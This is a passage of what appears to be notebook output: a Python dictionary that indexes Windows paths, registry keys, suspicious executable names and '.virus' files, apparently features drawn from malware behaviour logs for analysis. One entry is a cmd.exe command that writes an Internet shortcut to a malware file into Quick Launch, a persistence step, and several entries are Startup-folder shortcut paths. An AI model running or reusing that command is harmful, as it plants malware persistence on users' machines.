       " 'C:\\\\Users\\\\natalie04\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.XGpuEjectDialog_cw5n1h2txyewy\\\\AC\\\\*': 139,\n",
       " 'cmd.exe /C echo [InternetShortcut] > %temp%\\\\C:\\\\Windows\\\\System32\\\\config\\\\systemprofile\\\\AppData\\\\Roaming\\\\Microsoft\\\\Internet Explorer\\\\Quick Launch\\\\Microsoft Edge.lnk.url && echo URL=4e1ca94cdfbdc18a65391dd3ee9c81c0.virus >> %temp%\\\\C:\\\\Windows\\\\System32\\\\config\\\\systemprofile\\\\AppData\\\\Roaming\\\\Microsoft\\\\Internet Explorer\\\\Quick Launch\\\\Microsoft Edge.lnk.url': 140,\n",
       " 'C:\\\\Users\\\\nataliekent\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsStore_8wekyb3d8bbwe\\\\SystemAppData': 141,\n",
       " 'C:\\\\Users\\\\townsendsylvia\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\apdfllckaahabafndbhieahigkjlhalf\\\\14.5_0\\\\_locales\\\\el\\\\*': 142,\n",
       " 'C:\\\\Users\\\\john95\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.UI.Xaml.2.6_8wekyb3d8bbwe\\\\AC\\\\INetCache\\\\*': 143,\n",
       " 'C:\\\\Users\\\\ohall\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.549981C3F5F10_8wekyb3d8bbwe\\\\LocalCache\\\\*': 144,\n",
       " 'C:\\\\Users\\\\julie68\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\aohghmighlieiainnegkcijnfilokake\\\\0.10_0\\\\_locales\\\\tr': 145,\n",
       " 'C:\\\\Users\\\\david75\\\\AppData\\\\Roaming\\\\Adobe\\\\*': 146,\n",
       " 'C:\\\\Users\\\\adamslydia\\\\Desktop\\\\Blacksmith-master\\\\Blacksmith-master\\\\templates\\\\azure\\\\Win10-PAN-FW\\\\*': 147,\n",
       " 'C:\\\\Users\\\\dkelly\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.HEIFImageExtension_8wekyb3d8bbwe\\\\AC\\\\INetCookies': 148,\n",
       " 'C:\\\\Users\\\\pwebb\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WebpImageExtension_8wekyb3d8bbwe\\\\SystemAppData\\\\*': 149,\n",
       " 'C:\\\\Users\\\\skoch\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.XGpuEjectDialog_cw5n1h2txyewy\\\\*': 150,\n",
       " 'C:\\\\Users\\\\steven78\\\\AppData\\\\Local\\\\Packages\\\\NcsiUwpApp_8wekyb3d8bbwe\\\\TempState': 151,\n",
       " 'C:\\\\Users\\\\fitzgeraldleslie\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Getstarted_8wekyb3d8bbwe\\\\LocalCache': 152,\n",
       " 'C:\\\\Users\\\\perezrodney\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.AsyncTextService_8wekyb3d8bbwe\\\\AC\\\\INetCache\\\\.git': 153,\n",
       " 'C:\\\\Users\\\\victoriacole\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\lt': 154,\n",
       " 'C:\\\\Users\\\\melindapatterson\\\\AppData\\\\Local\\\\Packages\\\\NcsiUwpApp_8wekyb3d8bbwe\\\\TempState\\\\*': 155,\n",
       " 'C:\\\\Users\\\\jonathan15\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Search_cw5n1h2txyewy\\\\AC\\\\TokenBroker\\\\*': 156,\n",
       " 'C:\\\\Users\\\\ricky35\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.LockApp_cw5n1h2txyewy\\\\AC\\\\INetCache\\\\.git': 157,\n",
       " 'C:\\\\Users\\\\vbuckley\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Xbox.TCUI_8wekyb3d8bbwe\\\\LocalState\\\\.git': 158,\n",
       " 'C:\\\\Users\\\\wendyroberts\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\apdfllckaahabafndbhieahigkjlhalf\\\\14.5_0\\\\_locales\\\\pt_BR\\\\.git': 159,\n",
       " 'C:\\\\Users\\\\davidsmith\\\\AppData\\\\Local\\\\Packages\\\\1527c705-839a-4832-9118-54d4Bd6a0c89_cw5n1h2txyewy\\\\Settings\\\\*': 160,\n",
       " 'C:\\\\Users\\\\swansontaylor\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\hr-BA': 161,\n",
       " 'C:\\\\Users\\\\evansdaniel\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup': 162,\n",
       " 'C:\\\\Users\\\\gfields\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\af\\\\*': 163,\n",
       " 'C:\\\\Users\\\\natalie04\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.XGpuEjectDialog_cw5n1h2txyewy\\\\AC\\\\Temp': 164,\n",
       " 'C:\\\\Users\\\\mariahwilson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\\\LocalState\\\\TargetedContentCache\\\\v3\\\\88000161\\\\*': 165,\n",
       " 'C:\\\\Users\\\\kathrynhall\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Office.OneNote_8wekyb3d8bbwe\\\\AC\\\\*': 166,\n",
       " 'C:\\\\Users\\\\christopher63\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Session Storage': 167,\n",
       " 'C:\\\\Users\\\\evan17\\\\Desktop\\\\Blacksmith-master\\\\Blacksmith-master\\\\templates\\\\azure\\\\Win10-PAN-FW\\\\scripts': 168,\n",
       " 'C:\\\\Users\\\\nicholas35\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.NET.Native.Runtime.1.7_8wekyb3d8bbwe\\\\AC\\\\Temp\\\\*': 169,\n",
       " 'C:\\\\Users\\\\meaganaustin\\\\AppData\\\\Local\\\\Packages\\\\c5e2524a-ea46-4f67-841f-6a9465d9d515_cw5n1h2txyewy\\\\AppData\\\\*': 170,\n",
       " 'C:\\\\Users\\\\john95\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Libraries\\\\.git': 171,\n",
       " 'C:\\\\Users\\\\sanchezmatthew\\\\AppData\\\\LocalLow\\\\Microsoft\\\\CryptnetUrlCache': 172,\n",
       " 'C:\\\\Users\\\\jenniferbaxter\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.VCLibs.140.00.UWPDesktop_8wekyb3d8bbwe\\\\AC\\\\INetCache\\\\*': 173,\n",
       " 'C:\\\\Users\\\\carlos72\\\\AppData\\\\Local\\\\Temp\\\\C:\\\\Users\\\\user\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\WINN.lnk.url:Zone.Identifier': 174,\n",
       " 'C:\\\\Users\\\\desireesantana\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.NarratorQuickStart_8wekyb3d8bbwe\\\\AC\\\\*': 175,\n",
       " 'C:\\\\Users\\\\nicholas35\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\aapocclcgogkmnckokdopfmhonfmgoek\\\\0.10_0\\\\_locales\\\\sk\\\\*': 176,\n",
       " 'C:\\\\Users\\\\nataliekent\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\te': 177,\n",
       " 'C:\\\\Users\\\\evansdaniel\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\\\LocalCache\\\\.git': 178,\n",
       " 'C:\\\\Users\\\\edward89\\\\AppData\\\\Local\\\\Temp\\\\C:\\\\Users\\\\user\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\Software Protection Service.lnk.url:Zone.Identifier': 179,\n",
       " 'C:\\\\Users\\\\vbuckley\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\\\LocalState\\\\TargetedContentCache\\\\v3\\\\88000163': 180,\n",
       " 'C:\\\\Users\\\\meaganaustin\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxIdentityProvider_8wekyb3d8bbwe\\\\RoamingState\\\\*': 181,\n",
       " 'C:\\\\Users\\\\nicholas37\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\apdfllckaahabafndbhieahigkjlhalf\\\\14.5_0\\\\_locales\\\\vi\\\\*': 182,\n",
       " 'C:\\\\Users\\\\amberhernandez\\\\AppData\\\\Local\\\\Packages\\\\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\\\\LocalState\\\\LocalFiles\\\\637680406057830000\\\\2': 183,\n",
       " 'C:\\\\Users\\\\ohall\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\aohghmighlieiainnegkcijnfilokake\\\\0.10_0\\\\_locales\\\\en_US\\\\.git': 184,\n",
       " 'C:\\\\Users\\\\victoriacole\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Office.OneNote_8wekyb3d8bbwe\\\\SystemAppData\\\\*': 185,\n",
       " 'C:\\\\Users\\\\sarahchandler\\\\AppData\\\\Local\\\\Packages\\\\*': 186,\n",
       " 'C:\\\\Users\\\\elizabethgoodman\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\felcaaldnbdncclmgdcncolpebgiejap\\\\1.2_0\\\\_locales\\\\fi\\\\*': 187,\n",
       " 'C:\\\\Users\\\\fitzgeraldleslie\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\mn\\\\*': 188,\n",
       " 'C:\\\\Users\\\\nicholas37\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Microsoft3DViewer_8wekyb3d8bbwe\\\\AC\\\\INetHistory\\\\.git': 189,\n",
       " 'C:\\\\Users\\\\devon54\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Microsoft3DViewer_8wekyb3d8bbwe\\\\LocalState\\\\.git': 190,\n",
       " 'C:\\\\Users\\\\lopezmonica\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Snapshots\\\\93.0.961.52\\\\*': 191,\n",
       " 'C:\\\\Users\\\\faulkneramy\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.OOBENetworkConnectionFlow_cw5n1h2txyewy\\\\AC\\\\*': 192,\n",
       " 'C:\\\\Users\\\\nholt\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ParentalControls_cw5n1h2txyewy\\\\AC\\\\INetCookies': 193,\n",
       " 'C:\\\\Users\\\\crosschristine\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\INetCache\\\\Virtualized\\\\.git': 194,\n",
       " 'C:\\\\Users\\\\fgarrison\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\pjkljhegncpnkpknbcohdijeoejaedia\\\\8.3_0\\\\_locales\\\\cs\\\\.git': 195,\n",
       " 'C:\\\\Users\\\\jacob97\\\\AppData\\\\LocalLow\\\\Microsoft\\\\CryptnetUrlCache\\\\MetaData\\\\.git': 196,\n",
       " 'C:\\\\Users\\\\kyle74\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.CredDialogHost_cw5n1h2txyewy\\\\LocalCache': 197,\n",
       " 'HKLM\\\\SOFTWARE\\\\WOW6432Node\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\FolderDescriptions\\\\{AE50C081-EBD2-438A-8655-8A092E34987A}\\\\Description': 198,\n",
       " 'C:\\\\Users\\\\chadhicks\\\\AppData\\\\Local\\\\Packages\\\\NcsiUwpApp_8wekyb3d8bbwe\\\\*': 199,\n",
       " 'C:\\\\Users\\\\nataliekent\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy\\\\SystemAppData\\\\*': 200,\n",
       " 'C:\\\\Users\\\\skoch\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\pt-BR\\\\*': 201,\n",
       " 'C:\\\\Users\\\\scooper\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\nmmhkkegccagdldgiimedpiccmgmieda\\\\1.0.0.6_0\\\\_locales\\\\ro\\\\.git': 202,\n",
       " 'C:\\\\Users\\\\chadhicks\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\\\RoamingState': 203,\n",
       " 'pdfembargodiangovcodeudapendientereferenciamora.exe': 204,\n",
       " 'C:\\\\Users\\\\wthornton\\\\AppData\\\\Local\\\\Packages\\\\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\\\\AppData\\\\.git': 205,\n",
       " 'Confirmacion Transfer.exe': 206,\n",
       " 'C:\\\\Users\\\\devon54\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsCalculator_8wekyb3d8bbwe\\\\AC\\\\Temp\\\\*': 207,\n",
       " 'C:\\\\Users\\\\ricky35\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.People_8wekyb3d8bbwe\\\\TempState\\\\.git': 208,\n",
       " 'C:\\\\Users\\\\barnescindy\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\images\\\\.git': 209,\n",
       " 'C:\\\\Users\\\\jacobsmith\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxSpeechToTextOverlay_8wekyb3d8bbwe\\\\SystemAppData': 210,\n",
       " 'C:\\\\Users\\\\natalie04\\\\AppData\\\\Local\\\\Packages\\\\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\\\\Settings': 211,\n",
       " 'C:\\\\Users\\\\jessicajacobson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.CapturePicker_cw5n1h2txyewy\\\\AppData\\\\*': 212,\n",
       " 'C:\\\\Users\\\\melindapatterson\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\ShaderCache\\\\GPUCache': 213,\n",
       " 'C:\\\\Users\\\\ricky35\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\\\LocalState\\\\ContentManagementSDK\\\\Creatives\\\\280811': 214,\n",
       " 'C:\\\\Users\\\\jacobsmith\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\\\AC\\\\INetCookies\\\\ESE\\\\.git': 215,\n",
       " 'C:\\\\Users\\\\bmoore\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\logs\\\\.git': 216,\n",
       " 'C:\\\\Users\\\\alisonhaynes\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftOfficeHub_8wekyb3d8bbwe\\\\AC\\\\Microsoft': 217,\n",
       " 'C:\\\\Users\\\\nsilva\\\\AppData\\\\Local\\\\Packages\\\\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\\\\.git': 218,\n",
       " 'C:\\\\Users\\\\mitchellteresa\\\\AppData\\\\Local\\\\Packages\\\\E2A4F912-2574-4A75-9BB0-0D023378592B_cw5n1h2txyewy\\\\AppData\\\\*': 219,\n",
       " 'C:\\\\Users\\\\anthonysheila\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\ta\\\\.git': 220,\n",
       " 'C:\\\\Users\\\\wyatt69\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.NarratorQuickStart_8wekyb3d8bbwe\\\\TempState\\\\*': 221,\n",
       " 'C:\\\\Users\\\\bmoore\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\af\\\\*': 222,\n",
       " 'C:\\\\Users\\\\perezrodney\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\Session Storage': 223,\n",
       " 'C:\\\\Users\\\\heatherhoward\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxIdentityProvider_8wekyb3d8bbwe\\\\RoamingState\\\\*': 224,\n",
       " 'C:\\\\Users\\\\skoch\\\\AppData\\\\Local\\\\Packages\\\\c5e2524a-ea46-4f67-841f-6a9465d9d515_cw5n1h2txyewy\\\\TempState\\\\.git': 225,\n",
       " 'C:\\\\Users\\\\stephaniewood\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.CloudExperienceHost_cw5n1h2txyewy\\\\LocalState\\\\*': 226,\n",
       " 'C:\\\\Users\\\\lopezmonica\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Microsoft3DViewer_8wekyb3d8bbwe\\\\Settings\\\\*': 227,\n",
       " 'C:\\\\Users\\\\jonathan15\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\hyphen-data\\\\101.0.4906.0\\\\_metadata\\\\.git': 228,\n",
       " 'C:\\\\Users\\\\lopezmonica\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\platforms\\\\.git': 229,\n",
       " 'C:\\\\Users\\\\amy04\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WebMediaExtensions_8wekyb3d8bbwe\\\\Settings': 230,\n",
       " 'C:\\\\Users\\\\devon54\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\fr-CM\\\\.git': 231,\n",
       " 'C:\\\\Users\\\\ricky35\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.PeopleExperienceHost_cw5n1h2txyewy\\\\RoamingState\\\\*': 232,\n",
       " 'C:\\\\Users\\\\brian88\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.OOBENetworkConnectionFlow_cw5n1h2txyewy\\\\AC\\\\INetCookies\\\\*': 233,\n",
       " 'C:\\\\Users\\\\wendyroberts\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.SkypeApp_kzf8qxf38zg5c\\\\LocalCache\\\\Local': 234,\n",
       " 'C:\\\\Users\\\\perezrodney\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\nmmhkkegccagdldgiimedpiccmgmieda\\\\1.0.0.6_0\\\\_locales\\\\zh_TW\\\\*': 235,\n",
       " 'C:\\\\Users\\\\john95\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\blpcfgokakmgnkcojhhkbfbldkacnbeo\\\\4.2.8_0\\\\_locales\\\\no': 236,\n",
       " 'C:\\\\Users\\\\uanderson\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\blpcfgokakmgnkcojhhkbfbldkacnbeo\\\\4.2.8_0\\\\_locales\\\\sv\\\\.git': 237,\n",
       " 'C:\\\\Users\\\\garypetty\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftOfficeHub_8wekyb3d8bbwe\\\\Settings': 238,\n",
       " 'C:\\\\Users\\\\ijohnson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\\\TempState\\\\*': 239,\n",
       " 'C:\\\\Users\\\\harristheresa\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\aohghmighlieiainnegkcijnfilokake\\\\0.10_0\\\\_locales\\\\sk\\\\.git': 240,\n",
       " 'C:\\\\Users\\\\amy04\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Win32WebViewHost_cw5n1h2txyewy\\\\SystemAppData\\\\.git': 241,\n",
       " 'C:\\\\Users\\\\swansontaylor\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Win32WebViewHost_cw5n1h2txyewy\\\\Settings\\\\*': 242,\n",
       " 'C:\\\\Users\\\\david75\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\it\\\\*': 243,\n",
       " 'C:\\\\Users\\\\sarahchandler\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\kk': 244,\n",
       " 'C:\\\\Users\\\\bmoore\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\es-SV\\\\.git': 245,\n",
       " 'C:\\\\Users\\\\perezkenneth\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extension Scripts': 246,\n",
       " 'C:\\\\Users\\\\stephaniewood\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\apdfllckaahabafndbhieahigkjlhalf\\\\14.5_0\\\\_locales\\\\ca\\\\*': 247,\n",
       " 'C:\\\\Users\\\\davidsmith\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\felcaaldnbdncclmgdcncolpebgiejap\\\\1.2_0\\\\_locales\\\\et': 248,\n",
       " 'C:\\\\Users\\\\heatherhoward\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\eu\\\\.git': 249,\n",
       " 'C:\\\\Users\\\\richard97\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ParentalControls_cw5n1h2txyewy\\\\LocalState\\\\.git': 250,\n",
       " 'C:\\\\Users\\\\leahbrown\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.BioEnrollment_cw5n1h2txyewy\\\\AC\\\\INetCache\\\\*': 251,\n",
       " 'C:\\\\Users\\\\nholt\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.OOBENetworkCaptivePortal_cw5n1h2txyewy\\\\RoamingState': 252,\n",
       " 'HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\FolderDescriptions\\\\{f3ce0f7c-4901-4acc-8648-d5d44b04ef8f}\\\\StreamResourceType': 253,\n",
       " 'C:\\\\Users\\\\anthonysheila\\\\Desktop\\\\Blacksmith-master\\\\Blacksmith-master\\\\resources\\\\configs\\\\nxlog\\\\*': 254,\n",
       " 'C:\\\\Users\\\\ngray\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftSolitaireCollection_8wekyb3d8bbwe\\\\RoamingState\\\\.git': 255,\n",
       " 'C:\\\\Users\\\\ngray\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\ListSync\\\\Business1\\\\*': 256,\n",
       " 'C:\\\\Users\\\\yjones\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftSolitaireCollection_8wekyb3d8bbwe\\\\Settings': 257,\n",
       " 'C:\\\\Users\\\\evansdaniel\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\qml\\\\QtQuick\\\\Templates.2\\\\.git': 258,\n",
       " 'C:\\\\Users\\\\scooper\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\kn\\\\.git': 259,\n",
       " 'C:\\\\Users\\\\vbuckley\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxIdentityProvider_8wekyb3d8bbwe\\\\AppData': 260,\n",
       " 'HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\CapabilityAccessManager\\\\ConsentStore\\\\microphone\\\\NonPackaged\\\\348f2713fba8f0543600bf38c8427eb9996769654987516e3f0202f7bcf17228.sample\\\\LastUsedTimeStart': 261,\n",
       " 'C:\\\\Users\\\\nsilva\\\\Desktop\\\\Blacksmith-master\\\\Blacksmith-master\\\\resources\\\\images\\\\.git': 262,\n",
       " 'C:\\\\Users\\\\evan17\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Sync Data': 263,\n",
       " 'C:\\\\Users\\\\nsilva\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Search_cw5n1h2txyewy\\\\SystemAppData\\\\.git': 264,\n",
       " 'C:\\\\Users\\\\amy04\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\\\LocalState\\\\ContentManagementSDK\\\\Creatives\\\\onesettings_waas_featuremanagement\\\\*': 265,\n",
       " 'C:\\\\Users\\\\melindapatterson\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\EdgeCoupons': 266,\n",
       " 'C:\\\\Users\\\\inguyen\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\es-CR': 267,\n",
       " 'C:\\\\Users\\\\sarahchandler\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\nmmhkkegccagdldgiimedpiccmgmieda\\\\1.0.0.6_0\\\\_locales\\\\pt_PT\\\\*': 268,\n",
       " 'C:\\\\Users\\\\elizabethgoodman\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\aapocclcgogkmnckokdopfmhonfmgoek\\\\0.10_0\\\\_locales\\\\it': 269,\n",
       " 'C:\\\\Users\\\\jorgeterry\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WebpImageExtension_8wekyb3d8bbwe\\\\Settings': 270,\n",
       " 'C:\\\\Users\\\\christopher63\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WebpImageExtension_8wekyb3d8bbwe\\\\AC\\\\INetHistory\\\\.git': 271,\n",
       " 'C:\\\\Users\\\\wthornton\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extension Scripts\\\\.git': 272,\n",
       " 'C:\\\\Users\\\\angela76\\\\AppData\\\\Local\\\\Packages\\\\Windows.PrintDialog_cw5n1h2txyewy\\\\AC\\\\Temp': 273,\n",
       " 'C:\\\\Users\\\\wthornton\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.NET.Native.Framework.2.2_8wekyb3d8bbwe\\\\AC\\\\INetCache\\\\*': 274,\n",
       " 'C:\\\\Users\\\\garypetty\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.ScreenSketch_8wekyb3d8bbwe\\\\AC\\\\Temp\\\\.git': 275,\n",
       " 'C:\\\\Users\\\\melindapatterson\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\FirstPartySetsPreloaded\\\\*': 276,\n",
       " 'C:\\\\Users\\\\jennifertaylor\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\af\\\\.git': 277,\n",
       " 'C:\\\\Users\\\\lopezmonica\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxGameOverlay_8wekyb3d8bbwe\\\\AC\\\\Temp\\\\.git': 278,\n",
       " 'C:\\\\Users\\\\sanchezmatthew\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Crowd Deny\\\\*': 279,\n",
       " 'C:\\\\Users\\\\annetteyoung\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.People_8wekyb3d8bbwe\\\\.git': 280,\n",
       " 'C:\\\\Users\\\\larry44\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.YourPhone_8wekyb3d8bbwe\\\\LocalCache\\\\*': 281,\n",
       " 'C:\\\\Users\\\\anthonysheila\\\\AppData\\\\Local\\\\Publishers\\\\8wekyb3d8bbwe\\\\Fonts': 282,\n",
       " 'C:\\\\Users\\\\brian88\\\\AppData\\\\Local\\\\OneDrive\\\\cache\\\\*': 283,\n",
       " 'C:\\\\Users\\\\jacob97\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\\\AC\\\\INetHistory\\\\BackgroundTransferApiGroup\\\\.git': 284,\n",
       " 'C:\\\\Users\\\\scooper\\\\AppData\\\\Local\\\\Packages\\\\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\\\\SystemAppData\\\\.git': 285,\n",
       " 'C:\\\\Users\\\\uanderson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.YourPhone_8wekyb3d8bbwe\\\\AC\\\\INetHistory\\\\*': 286,\n",
       " 'C:\\\\Users\\\\nholt\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.VCLibs.140.00.UWPDesktop_8wekyb3d8bbwe\\\\AC\\\\INetCookies': 287,\n",
       " 'C:\\\\Users\\\\bakerrenee\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Edge Shopping\\\\*': 288,\n",
       " '92001e9cebec0f0f0ac2b7c7e04f017d.virus': 289,\n",
       " 'wlua5.1.exe': 290,\n",
